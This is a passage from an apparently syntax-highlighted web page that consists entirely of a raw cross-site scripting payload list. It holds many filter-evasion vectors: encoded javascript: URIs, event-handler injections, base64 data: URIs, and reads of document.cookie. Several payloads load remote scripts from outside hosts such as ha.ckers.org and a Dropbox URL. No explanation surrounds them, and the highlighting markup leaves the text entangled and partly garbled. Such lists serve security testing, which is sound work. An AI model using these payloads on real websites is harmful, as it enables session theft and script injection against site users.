class="string">data&amp;colon;,window.open(</span>&#x27;<span class="attr">https:</span>//<span class="attr">www.google.com</span>/&#x27;)&gt;</span><span class="handlebars"><span class="xml">&lt;/script<span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span> <span class="attr">x:href</span>=<span class="string">&#x27;https://dl.dropbox.com/u/13018058/js.js&#x27;</span> &#123;<span class="attr">Opera</span>&#125;&lt;<span class="attr">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;refresh&quot;</span> <span class="attr">content</span>=<span class="string">&quot;0;url=javascript:confirm(1)&quot;</span>&gt;</span><span class="handlebars"><span class="xml"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">javascript&amp;colon;alert&amp;lpar;document&amp;period;location&amp;rpar;</span>&gt;</span><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:\u0061lert<span class="symbol">&amp;#x28;</span>1<span class="symbol">&amp;#x29;</span>&quot;</span>&gt;</span>X</span></span></span></span></span></span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>&lt;img/*%00/src=&quot;worksinchrome<span class="symbol">&amp;colon;</span>prompt<span class="symbol">&amp;#x28;</span>1<span class="symbol">&amp;#x29;</span>&quot;/%00*/onerror=&#x27;eval(src)&#x27;&gt;&lt;img/<span class="symbol">&amp;#09;</span><span class="symbol">&amp;#10;</span><span class="symbol">&amp;#11;</span> src=`~` onerror=prompt(1)&gt;<span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">iframe</span> &amp;#<span class="attr">09</span>;&amp;#<span class="attr">10</span>;&amp;#<span class="attr">11</span>; <span class="attr">src</span>=<span class="string">&quot;javascript<span class="symbol">&amp;#58;</span>alert(1)&quot;</span>&amp;#<span class="attr">11</span>;&amp;#<span class="attr">10</span>;&amp;#<span class="attr">09</span>;;&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;data:application/x-x509-user-cert;<span class="symbol">&amp;NewLine;</span>base64<span class="symbol">&amp;NewLine;</span>,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;</span>&amp;#<span class="attr">09</span>;&amp;#<span class="attr">10</span>;&amp;#<span class="attr">11</span>;&gt;</span>X&lt;/ahttp://www.google<span class="tag">&lt;<span class="name">script</span> <span class="attr">.com</span>&gt;</span><span class="handlebars"><span class="xml">alert(document.location)&lt;/script&lt;a<span class="symbol">&amp;#32;</span>href<span class="symbol">&amp;#61;</span><span class="symbol">&amp;#91;</span><span class="symbol">&amp;#00;</span><span class="symbol">&amp;#93;</span>&quot;<span class="symbol">&amp;#00;</span> onmouseover=prompt<span class="symbol">&amp;#40;</span>1<span class="symbol">&amp;#41;</span><span class="symbol">&amp;#47;</span><span class="symbol">&amp;#47;</span>&quot;&gt;XYZ&lt;/a&lt;img/src=@<span class="symbol">&amp;#32;</span><span class="symbol">&amp;#13;</span> onerror = prompt(&#x27;<span class="symbol">&amp;#49;</span>&#x27;)&lt;style/onload=prompt<span class="symbol">&amp;#40;</span>&#x27;<span class="symbol">&amp;#88;</span><span class="symbol">&amp;#83;</span><span class="symbol">&amp;#83;</span>&#x27;<span class="symbol">&amp;#41;</span><span class="tag">&lt;<span class="name">script</span> ^<span class="attr">__</span>^&gt;</span><span class="handlebars"><span class="xml">alert(String.fromCharCode(49))&lt;/script ^__^&lt;/style <span class="symbol">&amp;#32;</span>&gt;<span class="tag">&lt;<span class="name">script</span> &amp;#<span class="attr">32</span>; <span class="attr">:-</span>(&gt;</span><span class="handlebars"><span class="xml">/**/alert(document.location)/**/&lt;/script <span class="symbol">&amp;#32;</span> :-(<span class="symbol">&amp;#00;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>&amp;#<span class="attr">61</span>;&quot;<span class="attr">date</span>&quot; <span class="attr">onfocus</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">textarea</span> &amp;#<span class="attr">13</span>; <span class="attr">onkeyup</span>=<span class="string">&#x27;\u0061\u006C\u0065\u0072\u0074<span class="symbol">&amp;#x28;</span>1<span class="symbol">&amp;#x29;</span>&#x27;</span>&gt;</span><span class="tag">&lt;<span class="name">script</span> /***/&gt;</span><span class="handlebars"><span class="xml">/***/confirm(&#x27;\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450&#x27;)/***/&lt;/script /***/<span class="tag">&lt;<span class="name">iframe</span> <span class="attr">srcdoc</span>=<span class="string">&#x27;<span class="symbol">&amp;lt;</span>body onload=prompt<span class="symbol">&amp;lpar;</span>1<span class="symbol">&amp;rpar;</span><span class="symbol">&amp;gt;</span>&#x27;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:void(0)&quot;</span> <span class="attr">onmouseover</span>=<span class="string">&amp;NewLine;javascript:alert(1)&amp;NewLine;</span>&gt;</span>X<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">script</span> ~~~&gt;</span><span class="handlebars"><span class="xml">alert(0%0)&lt;/script ~~~&gt;&lt;style/onload=<span class="symbol">&amp;lt;</span>!--<span class="symbol">&amp;#09;</span><span class="symbol">&amp;gt;</span><span class="symbol">&amp;#10;</span>alert<span class="symbol">&amp;#10;</span><span class="symbol">&amp;lpar;</span>1<span class="symbol">&amp;rpar;</span>&gt;&lt;///style///&gt;<span class="tag">&lt;<span class="name">span</span> %<span class="attr">2F</span> <span class="attr">onmousemove</span>=<span class="string">&#x27;alert<span class="symbol">&amp;lpar;</span>1<span class="symbol">&amp;rpar;</span>&#x27;</span>&gt;</span>SPAN&lt;img/src=&#x27;http://i.imgur.com/P8mL8.jpg&#x27; onmouseover=<span class="symbol">&amp;Tab;</span>prompt(1)<span class="symbol">&amp;#34;</span><span class="symbol">&amp;#62;</span><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="xml">&#123;-o-link-source<span class="symbol">&amp;colon;</span>&#x27;&lt;body/onload=confirm(1)&gt;&#x27;<span class="symbol">&amp;#13;</span>&lt;blink/<span class="symbol">&amp;#13;</span> onmouseover=pr<span class="symbol">&amp;#x6F;</span>mp<span class="symbol">&amp;#116;</span>(1)&gt;OnMouseOver &#123;Firefox &amp; Opera&#125;<span class="tag">&lt;<span class="name">marquee</span> <span class="attr">onstart</span>=<span class="string">&#x27;javascript:alert<span class="symbol">&amp;#x28;</span>1<span class="symbol">&amp;#x29;</span>&#x27;</span>&gt;</span>^__^&lt;div/style=&quot;width:expression(confirm(1))&quot;&gt;X<span class="tag">&lt;/<span class="name">div</span>&gt;</span> &#123;IE7&#125;&lt;iframe/%00/ src=javaSCRIPT<span class="symbol">&amp;colon;</span>alert(1)//&lt;form/action=javascript<span class="symbol">&amp;#x3A;</span>alert<span class="symbol">&amp;lpar;</span>document<span class="symbol">&amp;period;</span>cookie<span class="symbol">&amp;rpar;</span>&gt;&lt;input/type=&#x27;submit&#x27;&gt;///*iframe/src*/&lt;iframe/src=&quot;&lt;iframe/src=@&quot;/onload=prompt(1) /*iframe/src*/&gt;//|\\ <span class="tag">&lt;<span class="name">script</span> //|\\ <span class="attr">src</span>=<span class="string">&#x27;https://dl.dropbox.com/u/13018058/js.js&#x27;</span>&gt;</span><span class="handlebars"><span class="xml"> //|\\ &lt;/script //|\\<span class="tag">&lt;/<span class="name">font</span>&gt;</span>/<span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="xml">&#123;src<span class="symbol">&amp;#x3A;</span>&#x27;&lt;style/onload=this.onload=confirm(1)&gt;&#x27;<span class="tag">&lt;/<span class="name">font</span>&gt;</span>/</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span>&lt;a/href=&quot;javascript:<span class="symbol">&amp;#13;</span> javascript:prompt(1)&quot;&gt;<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;X&quot;</span>&gt;</span>&lt;/plaintext\&gt;&lt;/|\&gt;&lt;plaintext/onmouseover=prompt(1)<span class="tag">&lt;/<span class="name">svg</span>&gt;</span>&#x27;&#x27;<span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span> &#x27;<span class="attr">AQuickBrownFoxJumpsOverTheLazyDog</span>&#x27;&gt;</span><span class="handlebars"><span class="xml">alert<span class="symbol">&amp;#x28;</span>1<span class="symbol">&amp;#x29;</span> &#123;Opera&#125;<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript<span class="symbol">&amp;colon;</span>\u0061<span class="symbol">&amp;#x6C;</span>&amp;#101%72t<span class="symbol">&amp;lpar;</span>1<span class="symbol">&amp;rpar;</span>&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">button</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">onmouseover</span>=<span class="string">&#x27;alert<span class="symbol">&amp;lpar;</span>1<span class="symbol">&amp;rpar;</span>&#x27;</span>&gt;</span>DIV<span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">style</span>=<span class="string">&quot;xg-p:absolute;top:0;left:0;width:100%;height:100%&quot;</span> <span class="attr">onmouseover</span>=<span class="string">&quot;prompt(1)&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;jAvAsCrIpT<span class="symbol">&amp;colon;</span>alert<span class="symbol">&amp;lpar;</span>1<span class="symbol">&amp;rpar;</span>&quot;</span>&gt;</span>X<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">embed</span> <span class="attr">src</span>=<span class="string">&quot;http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">object</span> <span class="attr">data</span>=<span class="string">&quot;http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">var</span> <span class="attr">onmouseover</span>=<span class="string">&quot;prompt(1)&quot;</span>&gt;</span>On Mouse Over<span class="tag">&lt;/<span class="name">var</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript&amp;colon;alert&amp;lpar;document&amp;period;cookie&amp;rpar;</span>&gt;</span>Click Here<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/&quot;</span> =<span class="string">_</span>=<span class="string">&quot; title=&quot;</span><span class="attr">onerror</span>=<span class="string">&#x27;prompt(1)&#x27;</span>&quot;&gt;</span>&lt;%<span class="comment">&lt;!--&#x27;%&gt;&lt;script&gt;alert(1);&lt;/script --&gt;</span><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;data:text/javascript,alert(1)&quot;</span>&gt;</span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>&lt;iframe/src \/\/onload = prompt(1)&lt;iframe/onreadystatechange=alert(1)&lt;svg/onload=alert(1)<span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=&lt;&gt;</span>&lt;iframe/src=javascript:confirm(1)<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">value</span>=`` &lt;<span class="attr">div</span>/<span class="attr">onmouseover</span>=<span class="string">&#x27;alert(1)&#x27;</span>&gt;</span>X<span class="tag">&lt;/<span class="name">div</span>&gt;</span>http://www.<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="handlebars"><span class="xml">alert(1)&lt;/script .com<span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">j&amp;NewLine;&amp;Tab;a&amp;NewLine;&amp;Tab;&amp;Tab;v&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;a&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;s&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;c&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;r&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;i&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;p&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;t&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;colon;a&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;l&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;e&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;r&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;t&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;28&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;1&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;%29</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span> ?&gt;</span><span class="handlebars"><span class="xml">alert(1)<span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">j&amp;Tab;a&amp;Tab;v&amp;Tab;a&amp;Tab;s&amp;Tab;c&amp;Tab;r&amp;Tab;i&amp;Tab;p&amp;Tab;t&amp;Tab;:a&amp;Tab;l&amp;Tab;e&amp;Tab;r&amp;Tab;t&amp;Tab;%28&amp;Tab;1&amp;Tab;%29</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=`<span class="attr">xx:xx</span>`<span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;refresh&quot;</span> <span class="attr">content</span>=<span class="string">&quot;0;javascript<span class="symbol">&amp;colon;</span>alert(1)&quot;</span>/&gt;</span><span class="tag">&lt;<span class="name">math</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">xlink:href</span>=<span class="string">&quot;//jsfiddle.net/t846h/&quot;</span>&gt;</span>click<span class="tag">&lt;<span class="name">embed</span> <span class="attr">code</span>=<span class="string">&quot;http://businessinfo.co.uk/labs/xss/xss.swf&quot;</span> <span class="attr">allowscriptaccess</span>=<span class="string">always</span>&gt;</span><span class="tag">&lt;<span class="name">svg</span> <span class="attr">contentScriptType</span>=<span class="string">text/vbs</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="handlebars"><span class="xml">MsgBox+1<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;data:text/html;base64_,&lt;svg/onload=\u0061<span class="symbol">&amp;#x6C;</span>&amp;#101%72t(1)&gt;&quot;</span>&gt;</span>X&lt;/a&lt;iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074(&#x27;\u0061&#x27;) worksinIE&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="handlebars"><span class="xml">~&#x27;\u0061&#x27; ; \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073. \u0061\u006C\u0065\u0072\u0074(~&#x27;\u0061&#x27;)&lt;/script U+&lt;script/src=&quot;data<span class="symbol">&amp;colon;</span>text%2Fj\u0061v\u0061script,\u0061lert(&#x27;\u0061&#x27;)&quot;&gt;&lt;/script a=\u0061 &amp; /=%2F&lt;script/src=data<span class="symbol">&amp;colon;</span>text/j\u0061v\u0061&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#116,\u0061%6C%65%72%74(/XSS/)&gt;&lt;/script<span class="tag">&lt;<span class="name">object</span> <span class="attr">data</span>=<span class="string">javascript&amp;colon;\u0061&amp;#x6C;&amp;#101%72t(1)</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>+-+-1-+-+alert(1)</span></span></span></span></span></span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>&lt;body/onload=<span class="symbol">&amp;lt;</span>!--<span class="symbol">&amp;gt;</span>&amp;#10alert(1)&gt;<span class="tag">&lt;<span class="name">script</span> <span class="attr">itworksinallbrowsers</span>&gt;</span><span class="handlebars"><span class="xml">/*&lt;script* */alert(1)&lt;/script<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span> ?<span class="attr">itworksonchrome</span>?\/<span class="attr">onerror</span> = <span class="string">alert(1)</span>&lt;<span class="attr">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="handlebars"><span class="xml">//<span class="symbol">&amp;NewLine;</span>confirm(1);&lt;/script <span class="tag">&lt;/<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span> <span class="attr">onlypossibleinopera:-</span>)&gt;</span><span class="handlebars"><span class="xml"> alert(1)<span class="tag">&lt;<span class="name">a</span> <span class="attr">aa</span> <span class="attr">aaa</span> <span class="attr">aaaa</span> <span class="attr">aaaaa</span> <span class="attr">aaaaaa</span> <span class="attr">aaaaaaa</span> <span class="attr">aaaaaaaa</span> <span class="attr">aaaaaaaaa</span> <span class="attr">aaaaaaaaaa</span> <span class="attr">href</span>=<span class="string">j&amp;#97v&amp;#97script&amp;#x3A;&amp;#97lert(1)</span>&gt;</span>ClickMe<span class="tag">&lt;<span class="name">script</span> <span class="attr">x</span>&gt;</span><span class="handlebars"><span class="xml"> alert(1) &lt;/script 1=2&lt;div/onmouseover=&#x27;alert(1)&#x27;&gt; style=&quot;x:&quot;&gt;&lt;--`&lt;img/src=` onerror=alert(1)&gt; --!&gt; &lt;script/src=&amp;#100&amp;#97&amp;#116&amp;#97:text/&amp;#x6a&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x000070&amp;#x074,<span class="symbol">&amp;#x0061;</span><span class="symbol">&amp;#x06c;</span><span class="symbol">&amp;#x0065;</span><span class="symbol">&amp;#x00000072;</span><span class="symbol">&amp;#x00074;</span>(1)&gt;</span></span></span></span></span></span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;xg-p:absolute;top:0;left:0;width:100%;height:100%&quot;</span> <span class="attr">onmouseover</span>=<span class="string">&quot;prompt(1)&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span>x<span class="tag">&lt;/<span class="name">button</span>&gt;</span>&quot;&gt;<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">window.open(</span>&#x27;<span class="attr">https:</span>//<span class="attr">www.google.com</span>/&#x27;);&gt;</span><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">button</span> <span class="attr">formaction</span>=<span class="string">javascript&amp;colon;alert(1)</span>&gt;</span>CLICKME<span class="tag">&lt;<span class="name">math</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">xlink:href</span>=<span class="string">&quot;//jsfiddle.net/t846h/&quot;</span>&gt;</span>click<span class="tag">&lt;<span class="name">object</span> <span class="attr">data</span>=<span class="string">data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;data:text/html;blabla,&amp;#60&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#116&amp;#32&amp;#115&amp;#114&amp;#99&amp;#61&amp;#34&amp;#104&amp;#116&amp;#116&amp;#112&amp;#58&amp;#47&amp;#47&amp;#115&amp;#116&amp;#101&amp;#114&amp;#110&amp;#101&amp;#102&amp;#97&amp;#109&amp;#105&amp;#108&amp;#121&amp;#46&amp;#110&amp;#101&amp;#116&amp;#47&amp;#102&amp;#111&amp;#111&amp;#46&amp;#106&amp;#115&amp;#34&amp;#62&amp;#60&amp;#47&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#116&amp;#62&amp;#8203&quot;</span>&gt;</span>Click Me<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span><span class="javascript"><span class="built_in">String</span>.fromCharCode(<span class="number">97</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">116</span>, <span class="number">40</span>, <span class="number">49</span>, <span class="number">41</span>)</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span>‘;alert(String.fromCharCode(88,83,83))//’;alert(String.fromCharCode(88,83,83))//”;alert(String.fromCharCode(88,83,83))//”;alert(String.fromCharCode(88,83,83))//–&gt;<span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span>”&gt;’&gt;<span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span><span class="javascript">alert(<span class="built_in">String</span>.fromCharCode(<span class="number">88</span>,<span class="number">83</span>,<span class="number">83</span>))</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span><span class="tag">&lt;<span class="name">IMG</span> “””&gt;</span><span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span>alert(“XSS”)<span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span>”&gt;<span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">javascript:alert(String.fromCharCode(88,83,83))</span>&gt;</span><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">”jav</span> <span class="attr">ascript:alert</span>(‘<span class="attr">XSS</span>’);”&gt;</span><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">”jav&amp;#x09;ascript:alert(‘XSS’);”</span>&gt;</span>&lt;<span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span><span class="javascript">alert(“XSS”);<span class="comment">//&lt;</span></span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span>%253cscript%253ealert(1)%253c/script%253e“&gt;&lt;s”%2b”cript&gt;alert(document.cookie)<span class="tag">&lt;/<span class="name">script</span>&gt;</span>foo<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span>&lt;scr<span class="tag">&lt;<span class="name">script</span>&gt;</span>ipt&gt;alert(1)&lt;/scr<span class="tag">&lt;/<span class="name">script</span>&gt;</span>ipt&gt;<span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;</span>&gt;</span><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041</span>&gt;</span><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29</span>&gt;</span><span class="tag">&lt;<span class="name">BODY</span> <span class="attr">BACKGROUND</span>=<span class="string">”javascript:alert(‘XSS’)”</span>&gt;</span><span class="tag">&lt;<span class="name">BODY</span> <span class="attr">ONLOAD</span>=<span class="string">alert(‘XSS’)</span>&gt;</span><span class="tag">&lt;<span class="name">INPUT</span> <span class="attr">TYPE</span>=<span class="string">”IMAGE”</span> <span class="attr">SRC</span>=<span class="string">”javascript:alert(‘XSS’);”</span>&gt;</span><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">”javascript:alert(‘XSS’)”</span>&lt;<span class="attr">iframe</span> <span class="attr">src</span>=<span class="string">http://ha.ckers.org/scriptlet.html</span> &lt;<span class="attr">javascript:alert</span>(&quot;<span class="attr">hellox</span> <span class="attr">worldss</span>&quot;)&lt;<span class="attr">img</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">javascript:alert(&amp;quot;XSS&amp;quot;)</span>&gt;</span>&lt;&quot;&#x27;;alert(String.fromCharCode(88,83,83))//\&#x27;;alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//\&quot;;alert(String.fromCharCode(88,83,83))//--&gt;<span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span>&quot;&gt;&#x27;&gt;<span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span><span class="javascript">alert(<span class="built_in">String</span>.fromCharCode(<span class="number">88</span>,<span class="number">83</span>,<span class="number">83</span>))</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span><span class="tag">&lt;<span class="name">META</span> <span class="attr">HTTP-EQUIV</span>=<span class="string">&quot;refresh&quot;</span> <span class="attr">CONTENT</span>=<span class="string">&quot;0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">IFRAME</span> <span class="attr">SRC</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">IFRAME</span>&gt;</span><span class="tag">&lt;<span class="name">EMBED</span> <span class="attr">SRC</span>=<span class="string">&quot;data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==&quot;</span> <span class="attr">type</span>=<span class="string">&quot;image/svg+xml&quot;</span> <span class="attr">AllowScriptAccess</span>=<span class="string">&quot;always&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">EMBED</span>&gt;</span><span class="tag">&lt;<span class="name">SCRIPT</span> <span class="attr">a</span>=<span class="string">&quot;&gt;&quot;</span> <span class="attr">SRC</span>=<span class="string">&quot;http://ha.ckers.org/xss.js&quot;</span>&gt;</span><span class="tag">&lt;/<span 